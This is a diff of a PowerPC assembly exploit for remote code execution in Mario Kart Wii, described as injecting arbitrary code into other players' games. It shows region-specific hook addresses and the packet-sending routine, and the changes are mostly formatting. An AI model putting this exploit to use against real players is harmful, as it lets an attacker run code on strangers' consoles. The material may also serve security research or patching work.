@@ -2,7 +2,7 @@
 # Mario Kart Wii Remote Code Execution #
 #--------------------------------------#
 # Author : MikeIsAStar                 #
-# Date   : 03 Nov 2023                 #
+# Date   : 03 Apr 2024                 #
 #--------------------------------------#
 # Description: This code will inject   #
 # arbitrary code into a client's game. #
@@ -30,10 +30,10 @@
 #======================================#
 #             Hook Address             #
 #--------------------------------------#
-# RMCP : 0x80657F30                    #
-# RMCE : 0x80653AA8                    #
-# RMCJ : 0x8065759C                    #
-# RMCK : 0x80646248                    #
+# RMCP: 0x80657F30                     #
+# RMCE: 0x80653AA8                     #
+# RMCJ: 0x8065759C                     #
+# RMCK: 0x80646248                     #
 #======================================#
 .globl _start
 _start:
@@ -59,12 +59,12 @@ payloadStart:
 payloadEnd:
 packetEnd:
 
-    lis       12, 0x80005F34@h
-    li        5, packetSize
-    mflr      4
-    ori       12, 12, 0x80005F34@l
-    stw       5, 8(3)
-    mtctr     12
-    lwz       3, 0(3)
+    lis       r12, 0x80005F34@h
+    li        r5, packetSize
+    mflr      r4
+    ori       r12, r12, 0x80005F34@l
+    stw       r5, 8(r3)
+    mtctr     r12
+    lwz       r3, 0(r3)
     bctrl
-    li        4, packetSize
+    li        r4, packetSize
